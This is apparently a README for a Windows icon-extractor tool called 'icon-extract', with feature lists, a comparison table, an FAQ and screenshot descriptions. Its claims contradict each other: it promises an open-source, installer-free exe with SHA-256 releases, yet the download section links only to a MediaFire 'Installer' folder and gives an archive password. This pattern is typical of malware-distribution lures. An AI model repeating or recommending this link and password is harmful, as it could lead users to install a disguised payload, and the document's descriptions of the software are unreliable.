# icon-extract

⭐ Free, open-source icon extractor for Windows — pull every icon size from exe, dll and ico files to PNG. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **All embedded sizes** — every icon group inside a binary listed from 16 px up to 256 px PNG-compressed frames
- ✅ **Batch folder scan** — walk a folder of exe and dll files and extract every icon group automatically
- ✅ **PNG and ICO output** — save as PNG for design tools or repack selected sizes into a fresh ICO
- ✅ **Preview grid** — see the actual icons before extracting, grouped by resource ID
- ✅ **Corner-case handling** — handles PE resources, cursor files and multi-language icon groups
- ✅ **No file modification** — read-only extraction; source binaries are never touched
- ✅ **100 MB self-contained exe** — runtime bundled, portable, offline, MIT with SHA-256 releases

## Why icon-extract

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **icon-extract** | IconsExtract | IconViewer | Resource Hacker |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Free | Free |
| Open source | **Yes** | No | No | No |
| Batch folder extraction | **Yes** | Partial | No | No |
| PNG export with alpha | **Yes** | Yes | Explorer only | Partial |
| Repack selected sizes to ICO | **Yes** | No | No | Yes |
| Portable, no install | **Yes, 100 MB** | Zip | Installer | Zip |

## FAQ

**how to extract icons from exe files on Windows?**

Explorer shows one icon per binary and hides the rest, while resource editors make you hunt inside unfamiliar dialogs. icon-extract lists every embedded size, previews them grouped by ID and exports clean alpha PNGs or repacked ICOs. It is a 100 MB portable exe, MIT, offline and strictly read-only.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark grid (#121418, yellow #FACC15): binaries list left, icon group grid right with size badges 16 through 256, checkboxes per size.
2. Extraction options: PNG or ICO output segmented control, filename pattern field, alpha preserved badge, target folder picker.
3. Batch run: folder scan result of 38 binaries and 412 icons, progress at 81 percent, log line reading no source files modified.

## Download

| Source | Link |
|---|---|
| 💾 **Installer icon-extract** | [Installer icon-extract](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).